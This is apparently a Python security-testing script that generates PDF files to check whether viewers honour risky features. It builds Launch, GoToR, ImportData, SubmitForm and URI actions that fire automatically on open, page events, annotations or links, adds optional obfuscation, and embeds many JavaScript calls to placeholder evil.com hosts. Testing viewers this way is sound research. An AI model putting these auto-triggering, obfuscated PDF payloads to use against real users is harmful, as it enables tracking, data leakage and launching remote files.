#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#####################################################
# actions.py: generate PDF files for url invocation #
# based on various actions (mode) and events (call) #
#####################################################

# python standard library
import re, argparse

# local helper classes
from helper import obfuscate, rand_uuid
from config import domain

# ----------------------------------------------------------------------

# uri schemes and protocols that may be handled
uri_schemes = ['http://']

# ----------------------------------------------------------------------

def filespec(url):
  return ['/F << /Type /FileSpec /F (' + url + ') /V true /FS /URL >>']

def gen_urls(): return sum([(filespec(scheme+rand_uuid()+'.'+args.mode+'.'+args.call+'.'+domain+'/0.pdf')) for scheme in uri_schemes], [])

def gen_uris(): return [scheme+rand_uuid()+'.'+args.mode+'.'+args.call+'.'+domain+'/0.pdf' for scheme in uri_schemes]

# ----------------------------------------------------------------------

# wrap payloads into minimal pdf file
def wrap(payloads):
  # standard objects for doc structure
  structure = [
  # catalog object
  '''
  << /Type /Catalog
     /Pages 2 0 R''' + (('''
     /URI << /Base (''' + args.b + ''') /Type /URI >>''') if args.b else '') + ('''
     /OpenAction 5 0 R''' if args.call == 'doc' else '') + ('''
     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>''' if args.mode in ('data','form') else '') + '''
  >>\n''',
  # pages object
  '''
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>\n''',
  # page object
  '''
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>''' + ('''
     /AA << /O 5 0 R
            /C 5 0 R
         >>''' if args.call == 'page' else '') + ('''
     /Annots [<< /Type /Annot
                 /Subtype /Screen
                 /Open true
                 /P 3 0 R
                 /AA << /E  5 0 R /X  5 0 R /D  5 0 R /U  5 0 R /Fo 5 0 R
                        /BI 5 0 R /PO 5 0 R /PC 5 0 R /PV 5 0 R /PI 5 0 R
                     >>
                 /Rect [0 0 595 842]
              >>]''' if args.call == 'anot' else '') + ('''
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]''' if args.call == 'link' else '') + '''
     /Contents [4 0 R]
  >>\n''',
  # testcase object
  '''
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: ''' + ("'"+args.mode+"'").ljust(10) + ''') Tj
  ET
endstream\n''',
  ]
  # obfuscate payloads
  objects = structure + payloads
  objects = [obfuscate(obj, args) for obj in objects]
  # create minimal pdf file
  doc = '%PDF-' + args.v + '\n\n'
  obj_offset = len(doc)
  objects = [str(num+1) + ' 0 obj' + obj + 'endobj\n\n' for num, obj in enumerate(objects)]
  for obj in objects: doc += obj
  xref_offset = str(len(doc))
  doc += 'xref\n0 ' + str(len(objects)+1) + '\n0000000000 65535 f '
  for obj in objects:
    doc += '\n' + str(obj_offset).zfill(10) + ' 00000 n '
    obj_offset = obj_offset + len(obj)
  doc += '\ntrailer\n  << /Root 1 0 R\n     /Size ' + str(len(objects)+1) + '\n  >>'
  doc += '\nstartxref\n' + xref_offset + '\n%%EOF'
  print(doc)

# ----------------------------------------------------------------------

def usage():
  parser = argparse.ArgumentParser(description="Create PDF file to test for insecure features")
  parser.add_argument('mode', choices=['print', 'launch', 'thread', 'gotoe', 'gotor',
                      'data', 'form', 'uri', 'js'], help="test mode/action to be executed")
  parser.add_argument('call', choices=['doc', 'page', 'anot', 'link', 'name'], help="how to trigger requested action")
  parser.add_argument("-v", metavar="version", default='1.7', help="PDF version used (default: 1.7)")
  parser.add_argument("-b", metavar="base", help="set a base URI for PDF document")
  parser.add_argument("-o", help="obfuscate (octal and linefeeds)", action="store_true")
  parser.add_argument("-x", help="obfuscate (hex and whitespaces)", action="store_true")
  return parser.parse_args()

global args; args = usage()


# ======================================================================

######################################################
# testcases to print embedded, local or remote files #
######################################################

payloads_print = ['''
  << /Type /Action
     /S /Launch
     ''' + fs + '''
     /Win << /O /print >>
     /NewWindow false
  >>
''' for fs in gen_urls() # (filespec('url'))
]

# ----------------------------------------------------------------------

######################################################
# testcases to launch embedded, local or remote files #
######################################################

payloads_launch = [
'''
  << /Type /Action
     /S /Launch
     ''' + fs + '''
     /NewWindow false
  >>
''' for fs in gen_urls() # (filespec('url'))
]

# ----------------------------------------------------------------------

######################################################
# testcases to thread embedded, local or remote files #
######################################################

payloads_thread = ['''
  << /Type /Action
     /S /Thread
     ''' + fs + '''
     /D 0
  >>
''' for fs in gen_urls() # (filespec('url'))
]

# ----------------------------------------------------------------------

######################################################
# testcases to gotoe embedded, local or remote files #
######################################################

payloads_gotoe = ['''
  << /Type /Action
     /S /GoToE
     ''' + fs + '''
     /NewWindow false
     /D [0 /Fit]
''' for fs in gen_urls() # (filespec('url'))
]

# ----------------------------------------------------------------------

######################################################
# testcases to gotor embedded, local or remote files #
######################################################

payloads_gotor = [
'''
  << /Type /Action
     /S /GoToR
     ''' + fs + '''
     /NewWindow false
     /D [0 /Fit]
  >>
''' for fs in gen_urls() # (filespec('url'))
]

# ----------------------------------------------------------------------

#################################################################
# testcases to import data from embedded, local or remote files #
#################################################################

payloads_data = ['''
  << /Type /Action
     /S /ImportData
     ''' + fs + '''
  >>
''' for fs in gen_urls() # (filespec('url'))
]

# ----------------------------------------------------------------------

###############################################################
# testcases to submit form to embedded, local or remote files #
###############################################################

payloads_form = [
'''
  << /Type /Action
     /S /SubmitForm
     ''' + fs + '''
     /Flags 4 % SubmitHTML
   % /Flags 32 % SubmitXFDF
   % /Flags 256 % SubmitPDF
  >>
''' for fs in gen_urls() # (filespec('url'))
]

# ----------------------------------------------------------------------

##############################
# testcases to request a URI #
##############################

payloads_uri = [
'''
  << /Type /Action
     /S /URI
     /URI (''' + uri + ''')
  >>
''' for uri in gen_uris()
]

# ----------------------------------------------------------------------

##############################################
# testcases to request a URI with JavaScript #
##############################################

payloads_js = [
'''
  << /Type /Action
     /S /JavaScript
     /JS (
/* ------------------------------------------------------------------------------------------ */
/* -----------------------------[ Acrobat JavaScript Scripting Guide ]----------------------- */
/* ------------------------------------------------------------------------------------------ */
try {this.submitForm({cURL: "http://submitform.evil.com/"});}                        catch(e) {}
try {this.getURL("http://geturl.evil.com/");}                                        catch(e) {}
try {app.launchURL("http://launchurl.evil.com/");}                                   catch(e) {}
try {app.media.getURLData("http://geturldata.evil.com/", "audio/mp3");}              catch(e) {}
try {SOAP.connect("http://soap-connect.evil.com/");}                                 catch(e) {}
try {SOAP.request({cURL:"http://soap-request.evil.com/", oRequest:{}, cAction:""});} catch(e) {}
try {this.importDataObject("file", "http://dataobject.js.evil.com/");}               catch(e) {}
try {app.openDoc("http://opendoc.js.evil.com/");}                                    catch(e) {}
/* ------------------------------------------------------------------------------------------ */
/* -----------------------------[ Vanilla ECMAScript used in the Web ]----------------------- */
/* ------------------------------------------------------------------------------------------ */
try {fetch("http://fetch.js.evil.com/");}                                            catch(e) {}
try {var r=new XMLHttpRequest(); r.open("GET", "http://xhr.js.evil.com"); r.send();} catch(e) {}
try {var img=new Image(1,1); img.src="http://img.js.evil.com/";}                     catch(e) {}
try {new WebSocket("ws://websocket.js.evil.com/");}                                  catch(e) {}
try {require("http://require.js.evil.com/");}                                        catch(e) {}
try {this.location="http://this-location.js.evil.com/";}                             catch(e) {}
try {document.location="http://document-location.js.evil.com/";}                     catch(e) {}
try {parent.window.location.href="http://parent-window.evil.com/";}                  catch(e) {}
try {parent.document.URL="http://parent-document.evil.com/";}                        catch(e) {}
try {window.location ="http://window-location.evil.com/";}                           catch(e) {}
try {window.location.href="http://window-location-href.evil.com/";}                  catch(e) {}
try {window.location.replace("http://window-location-replace.evil.com/");}           catch(e) {}
try {window.location.assign("http://window-location-assign.evil.com/");}             catch(e) {}
try {window.navigate("http://window-navigate.evil.com/");}                           catch(e) {}
app.alert("All JavaScript tests completed", 3);
/* ------------------------------------------------------------------------------------------ */
)
  >>
''' for uri in gen_uris()
]

# ----------------------------------------------------------------------

wrap(globals()['payloads_' + args.mode])
